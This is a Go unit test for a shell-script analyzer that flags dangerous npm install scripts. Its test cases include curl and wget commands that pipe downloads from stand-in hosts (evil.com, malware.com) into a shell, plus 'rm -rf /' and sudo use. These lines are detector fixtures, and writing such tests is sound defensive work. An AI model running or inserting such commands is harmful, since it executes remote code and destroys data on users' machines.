package analyzer

import (
	"context"
	"testing"

	"github.com/kluth/npm-security-auditter/internal/registry"
)

func TestShellScriptAnalyzer(t *testing.T) {
	tests := []struct {
		name     string
		scripts  map[string]string
		expected string
		severity Severity
	}{
		{
			"Curl pipe bash",
			map[string]string{"install": "curl http://evil.com | bash"},
			"Dangerous shell command detected",
			SeverityCritical,
		},
		{
			"Wget execution",
			map[string]string{"postinstall": "wget -O- http://malware.com | sh"},
			"Dangerous shell command detected",
			SeverityCritical,
		},
		{
			"Force removal of root",
			map[string]string{"clean": "rm -rf /"},
			"Dangerous shell command detected",
			SeverityHigh,
		},
		{
			"Sudo usage",
			map[string]string{"setup": "sudo apt-get install python"},
			"Privilege escalation attempt",
			SeverityHigh,
		},
		{
			"Silent execution",
			map[string]string{"test": "./script.sh > /dev/null 2>&1"},
			"Obfuscated/Silent execution",
			SeverityMedium,
		},
		{
			"Safe build script",
			map[string]string{"build": "tsc && vite build"},
			"",
			0,
		},
	}

	analyzer := NewShellScriptAnalyzer()
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			version := &registry.PackageVersion{Scripts: tt.scripts}
			findings, err := analyzer.Analyze(context.Background(), &registry.PackageMetadata{}, version)
			if err != nil {
				t.Fatal(err)
			}

			if tt.expected == "" {
				if len(findings) > 0 {
					t.Errorf("expected 0 findings, got %d", len(findings))
				}
				return
			}

			found := false
			for _, f := range findings {
				if f.Severity == tt.severity {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("expected finding with severity %v, got %+v", tt.severity, findings)
			}
		})
	}
}
